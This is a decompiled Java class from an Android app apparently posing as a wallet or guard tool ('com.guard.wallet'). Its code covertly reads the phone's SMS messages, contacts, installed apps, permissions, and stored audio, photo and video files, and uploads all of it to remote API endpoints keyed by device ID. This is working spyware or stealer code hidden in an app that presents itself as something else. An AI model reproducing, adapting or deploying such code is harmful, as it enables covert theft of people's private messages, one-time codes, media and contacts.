package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.sun.security.x509.InvalidityDateExtension;
import android.util.Log;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0199d;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.http.C0214s;
import com.guard.wallet.http.a0;
import com.guard.wallet.resp.ContactsBodyVO;
import com.guard.wallet.resp.PackagesBodyVO;
import com.guard.wallet.resp.PermissionsBodyVO;
import com.guard.wallet.resp.SmsMessageVO;
import com.guard.wallet.resp.SyncSmsBodyVO;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.File;
import java.util.LinkedList;
import java.util.concurrent.Callable;
import p007j.C0350e;

/* renamed from: com.guard.wallet.thread.m */
/* loaded from: classes.dex */
public final class CallableC0244m implements Callable {

    /* renamed from: a */
    public final /* synthetic */ int f394a;

    public /* synthetic */ CallableC0244m(int i2) {
        this.f394a = i2;
    }

    /* renamed from: a */
    public final Boolean m595a() {
        boolean z2 = true;
        Cursor cursor = null;
        switch (this.f394a) {
            case 0:
                if (AbstractC0251g.m653Z() != null && AbstractC0251g.m666m()) {
                    LinkedList linkedList = new LinkedList();
                    Uri uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                    String[] strArr = {"_id", "_data", "_display_name"};
                    ContentResolver contentResolver = AbstractC0251g.m653Z().getContentResolver();
                    if (contentResolver != null) {
                        try {
                            cursor = contentResolver.query(uri, strArr, null, null, "date_modified desc");
                            if (cursor != null) {
                                while (cursor.moveToNext()) {
                                    File file = new File(cursor.getString(cursor.getColumnIndex("_data")));
                                    if (file.exists() && file.isFile()) {
                                        linkedList.add(file);
                                    }
                                    if (linkedList.size() > 2) {
                                        AbstractC0207l.m413A(linkedList);
                                        linkedList.clear();
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("UploadAudioFileThread", e2);
                        }
                        if (cursor != null) {
                            cursor.close();
                        }
                    }
                    if (!linkedList.isEmpty()) {
                        AbstractC0207l.m413A(linkedList);
                    }
                }
                break;
            case 1:
                Log.d("UploadContactsThread", "正在同步设备联系人");
                String str = AbstractC0207l.f252a;
                String m708l = AbstractC0252h.m708l("deviceId");
                LinkedList w02 = AbstractC0251g.w0();
                if (AbstractC0026q.m151B(m708l)) {
                    z2 = false;
                } else {
                    ContactsBodyVO contactsBodyVO = new ContactsBodyVO();
                    contactsBodyVO.setDeviceId(m708l);
                    contactsBodyVO.setContacts(w02);
                    new C0204i().m408h(contactsBodyVO, "/api/contact/post.json", new C0199d());
                }
                break;
            case 2:
                Log.d("UploadInstalledPackagesThread", "正在同步设备已安装应用");
                String str2 = AbstractC0207l.f252a;
                String m708l2 = AbstractC0252h.m708l("deviceId");
                LinkedList e02 = AbstractC0251g.e0();
                if (AbstractC0026q.m151B(m708l2) || e02 == null || e02.isEmpty()) {
                    z2 = false;
                } else {
                    PackagesBodyVO packagesBodyVO = new PackagesBodyVO();
                    packagesBodyVO.setDeviceId(m708l2);
                    packagesBodyVO.setPackages(e02);
                    new C0204i().m408h(packagesBodyVO, "/api/package/post.json", new C0214s());
                }
                break;
            case 3:
                Log.d("UploadPermissionsThread", "正在同步App权限");
                String str3 = AbstractC0207l.f252a;
                String m708l3 = AbstractC0252h.m708l("deviceId");
                if (AbstractC0026q.m151B(m708l3)) {
                    z2 = false;
                } else {
                    PermissionsBodyVO h02 = AbstractC0251g.h0(null);
                    h02.setDeviceId(m708l3);
                    new C0204i().m408h(h02, "/api/permission/post.json", new C0350e(1));
                }
                break;
            case 4:
                if (AbstractC0251g.m653Z() != null && AbstractC0251g.m668o()) {
                    LinkedList linkedList2 = new LinkedList();
                    Uri uri2 = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                    String[] strArr2 = {"_id", "_data", "_display_name"};
                    ContentResolver contentResolver2 = AbstractC0251g.m653Z().getContentResolver();
                    if (contentResolver2 != null) {
                        try {
                            cursor = contentResolver2.query(uri2, strArr2, null, null, "date_modified desc");
                            if (cursor != null) {
                                while (cursor.moveToNext()) {
                                    File file2 = new File(cursor.getString(cursor.getColumnIndex("_data")));
                                    if (file2.exists() && file2.isFile()) {
                                        linkedList2.add(file2);
                                    }
                                    if (linkedList2.size() > 5) {
                                        AbstractC0207l.m416D(linkedList2);
                                        linkedList2.clear();
                                    }
                                }
                            }
                        } catch (Exception e3) {
                            AbstractC0026q.m186s("UploadPhotoFileThread", e3);
                        }
                        if (cursor != null) {
                            cursor.close();
                        }
                    }
                    if (!linkedList2.isEmpty()) {
                        AbstractC0207l.m416D(linkedList2);
                    }
                }
                break;
            case 5:
                if (AbstractC0251g.m653Z() != null && AbstractC0251g.m669p()) {
                    try {
                        LinkedList linkedList3 = new LinkedList();
                        Cursor query = AbstractC0251g.m653Z().getContentResolver().query(Uri.parse("content://sms/"), new String[]{"_id", "address", "person", "body", InvalidityDateExtension.DATE, "type"}, null, null, null);
                        if (query != null) {
                            while (query.moveToNext()) {
                                linkedList3.add(new SmsMessageVO(query.getString(query.getColumnIndex("address")), query.getString(query.getColumnIndex("person")), query.getString(query.getColumnIndex("body")), null, query.getString(query.getColumnIndex(InvalidityDateExtension.DATE)), Integer.valueOf(query.getInt(query.getColumnIndex("type")))));
                            }
                            if (!linkedList3.isEmpty()) {
                                String str4 = AbstractC0207l.f252a;
                                String m708l4 = AbstractC0252h.m708l("deviceId");
                                if (!AbstractC0026q.m151B(m708l4)) {
                                    new C0204i().m408h(new SyncSmsBodyVO(m708l4, linkedList3), "/api/smsMessage/post.json", new a0());
                                }
                            }
                        }
                    } catch (Exception e4) {
                        AbstractC0026q.m186s("UploadSmsThread", e4);
                    }
                }
                break;
            default:
                if (AbstractC0251g.m653Z() != null && AbstractC0251g.m670q()) {
                    LinkedList linkedList4 = new LinkedList();
                    Uri uri3 = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                    String[] strArr3 = {"_id", "_data", "_display_name"};
                    ContentResolver contentResolver3 = AbstractC0251g.m653Z().getContentResolver();
                    if (contentResolver3 != null) {
                        try {
                            cursor = contentResolver3.query(uri3, strArr3, null, null, "date_modified desc");
                            if (cursor != null) {
                                while (cursor.moveToNext()) {
                                    File file3 = new File(cursor.getString(cursor.getColumnIndex("_data")));
                                    if (file3.exists() && file3.isFile()) {
                                        linkedList4.add(file3);
                                    }
                                    if (linkedList4.size() > 2) {
                                        AbstractC0207l.m417E(linkedList4);
                                        linkedList4.clear();
                                    }
                                }
                            }
                        } catch (Exception e5) {
                            AbstractC0026q.m186s("UploadVideoFileThread", e5);
                        }
                        if (cursor != null) {
                            cursor.close();
                        }
                    }
                    if (!linkedList4.isEmpty()) {
                        AbstractC0207l.m417E(linkedList4);
                    }
                }
                break;
        }
        return Boolean.TRUE;
    }

    @Override // java.util.concurrent.Callable
    public final /* bridge */ /* synthetic */ Object call() {
        switch (this.f394a) {
        }
        return m595a();
    }
}
